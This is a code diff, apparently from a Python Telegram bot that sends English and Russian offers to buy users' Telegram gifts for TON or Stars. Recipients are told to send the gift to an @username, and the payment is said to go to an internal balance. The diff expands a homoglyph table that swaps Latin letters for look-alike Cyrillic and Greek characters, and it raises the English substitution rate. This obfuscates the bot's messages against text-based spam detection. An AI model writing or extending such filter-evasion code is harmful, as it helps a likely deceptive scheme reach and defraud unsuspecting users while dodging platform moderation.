@@ -32,7 +32,7 @@ NBSP = "\u00a0"
 
 OFFER_EDIT_DELAY = max(1.0, float(os.environ.get("OFFER_EDIT_DELAY", "1.0")))
 HOMOGLYPH_RATE = float(os.environ.get("HOMOGLYPH_RATE", "0.75"))
-HOMOGLYPH_RATE_EN = float(os.environ.get("HOMOGLYPH_RATE_EN", "0.15"))
+HOMOGLYPH_RATE_EN = float(os.environ.get("HOMOGLYPH_RATE_EN", "0.35"))
 BUTTON_STYLE = os.environ.get("BUTTON_STYLE", "")
 SEND_COOLDOWN = float(os.environ.get("SEND_COOLDOWN", "2.0"))
 
@@ -55,7 +55,61 @@ _last_send_by_bcid = {}
 # ============ HOMOGLYPH STYLE ============
 
 _HOMOGLYPH = {
-    # кириллица -> латиница/греческий
+    # --- строчная латиница -> кириллица/греческий ---
+    "a": ["а", "α"],
+    "b": ["Ь", "ḃ"],
+    "c": ["с", "ϲ"],
+    "d": ["ԁ", "ḍ"],
+    "e": ["е", "ε"],
+    "f": ["ғ", "ƒ"],
+    "g": ["ɡ", "ǵ"],
+    "h": ["һ", "հ"],
+    "i": ["і", "ı", "ι"],
+    "j": ["ј", "ʝ"],
+    "k": ["к", "κ"],
+    "l": ["ӏ", "ⅼ"],
+    "m": ["м", "ṃ"],
+    "n": ["ո", "ń"],
+    "o": ["о", "ο", "օ"],
+    "p": ["р", "ρ"],
+    "q": ["ԛ", "զ"],
+    "r": ["г", "ɾ"],
+    "s": ["ѕ", "ʂ"],
+    "t": ["т", "τ"],
+    "u": ["υ", "ս"],
+    "v": ["ν", "ѵ"],
+    "w": ["ԝ", "ѡ"],
+    "x": ["х", "χ"],
+    "y": ["у", "γ"],
+    "z": ["ᴢ", "ʐ"],
+    # --- заглавная латиница -> кириллица/греческий ---
+    "A": ["А", "Α"],
+    "B": ["В", "Β"],
+    "C": ["С", "Ϲ"],
+    "D": ["Д", "Ⅾ"],
+    "E": ["Е", "Ε"],
+    "F": ["Ғ", "Ϝ"],
+    "G": ["Ԍ", "Ԍ"],
+    "H": ["Н", "Η"],
+    "I": ["І", "Ι"],
+    "J": ["Ј", "Ϳ"],
+    "K": ["К", "Κ"],
+    "L": ["Ⅼ", "Ŀ"],
+    "M": ["М", "Μ"],
+    "N": ["Ν", "Ν"],
+    "O": ["О", "Ο"],
+    "P": ["Р", "Ρ"],
+    "Q": ["Ԛ", "Ԛ"],
+    "R": ["Г", "Ρ"],
+    "S": ["Ѕ", "Տ"],
+    "T": ["Т", "Τ"],
+    "U": ["Ս", "Ս"],
+    "V": ["Ⅴ", "Ѵ"],
+    "W": ["Ԝ", "Ԝ"],
+    "X": ["Х", "Χ"],
+    "Y": ["У", "Υ"],
+    "Z": ["Ζ", "Ƶ"],
+    # --- кириллица -> латиница/греческий (для RU) ---
     "а": ["a", "α"],
     "с": ["c"],
     "е": ["e"],
@@ -79,26 +133,6 @@ _HOMOGLYPH = {
     "І": ["I"],
     "Ј": ["J"],
     "Ѕ": ["S"],
-    # латиница -> кириллица/греческий (для EN и латинских частей RU)
-    "a": ["а", "α"],
-    "c": ["с"],
-    "e": ["е"],
-    "o": ["о", "ο"],
-    "p": ["р", "ρ"],
-    "x": ["х"],
-    "y": ["у"],
-    "k": ["к", "κ"],
-    "A": ["А"],
-    "B": ["В"],
-    "E": ["Е"],
-    "K": ["К"],
-    "M": ["М"],
-    "H": ["Н"],
-    "O": ["О"],
-    "P": ["Р"],
-    "C": ["С"],
-    "T": ["Т"],
-    "X": ["Х"],
 }
 
 _TAG_RE = re.compile(r"<(/?)(b|i|u|s|code|a|pre|em|strong|tg-spoiler)(\s[^>]*)?>", re.IGNORECASE)
@@ -469,8 +503,9 @@ def offer_text(o):
         if lang == "en":
             addr_text = f" to <code>{esc(o['address'])}</code>" if o.get("address") else ""
             amount = f"{num(o['amount'])} TON"
-            return (f"<b>{maker_label(o)}</b> offers you <b>{amount}</b>{addr_text} for {gift_link(o)}.\n\n"
-                    f"This offer is valid for {left_text(o['expires'] - time.time(), lang)}.")
+            return (f"<b>{maker_label(o)}</b>: {amount}{addr_text}\n"
+                    f"{gift_link(o)}\n\n"
+                    f"{left_text(o['expires'] - time.time(), lang)} left")
         addr_text = f" на ваш адрес <code>{esc(o['address'])}</code>" if o.get("address") else ""
         amount = f"{num(o['amount'])} TON"
         text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{amount}</b>{addr_text} за подарок {gift_link(o)}.\n\n"
@@ -478,8 +513,9 @@ def offer_text(o):
     else:
         if lang == "en":
             amount = f'{num(o["amount"])} {STARS_WORD_EN}'
-            return (f"<b>{maker_label(o)}</b> offers you <b>{amount}</b> for {gift_link(o)}.\n\n"
-                    f"This offer is valid for {left_text(o['expires'] - time.time(), lang)}.")
+            return (f"<b>{maker_label(o)}</b>: {amount}\n"
+                    f"{gift_link(o)}\n\n"
+                    f"{left_text(o['expires'] - time.time(), lang)} left")
         amount = f'{num(o["amount"])} {STARS_WORD_RU}'
         text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{amount}</b> за подарок {gift_link(o)}.\n\n"
                 f"Предложение действует ещё {left_text(o['expires'] - time.time(), lang)}")
@@ -495,9 +531,9 @@ def accepted_text(o):
         if lang == "en":
             addr_text = f" <code>{esc(o['address'])}</code>" if o.get("address") else ""
             amount = f"{num(o['amount'])} TON"
-            return (f"<b>Confirmed.</b>\n\n"
-                    f"Send {gift_link(o)} to @{esc(username)}.\n"
-                    f"Once delivered, <b>{amount}</b> will be credited to your balance{addr_text}.")
+            return (f"<b>Done.</b>\n"
+                    f"{gift_link(o)} → @{esc(username)}\n\n"
+                    f"{amount}{addr_text} → your balance.")
         addr_text = f" адреса <code>{esc(o['address'])}</code>" if o.get("address") else ""
         amount = f"{num(o['amount'])} TON"
         return (
@@ -508,9 +544,9 @@ def accepted_text(o):
         )
     if lang == "en":
         amount = f'{num(o["amount"])} {STARS_WORD_EN}'
-        return (f"<b>Confirmed.</b>\n\n"
-                f"Send {gift_link(o)} to @{esc(username)}.\n"
-                f"Once delivered, <b>{amount}</b> will be credited to your balance.")
+        return (f"<b>Done.</b>\n"
+                f"{gift_link(o)} → @{esc(username)}\n\n"
+                f"{amount} → your balance.")
     amount = f'{num(o["amount"])} {STARS_WORD_RU}'
     return (
         f"<b>Сделка принята!</b>\n\n"
@@ -525,16 +561,16 @@ def sold_text(o):
 
 
 def declined_text(o):
-    return "Offer declined." if _lang(o) == "en" else "Отклонено."
+    return "Declined." if _lang(o) == "en" else "Отклонено."
 
 
 def expired_text(o):
-    return "This offer has expired." if _lang(o) == "en" else "Предложение истекло."
+    return "Expired." if _lang(o) == "en" else "Предложение истекло."
 
 
 def done_text(o):
     if _lang(o) == "en":
-        return f"Confirmed. The deal for {gift_link(o)} is closed."
+        return f"Done. Deal for {gift_link(o)} closed."
     return f"Передача подтверждена. Сделка по {gift_link(o)} закрыта."
 
 
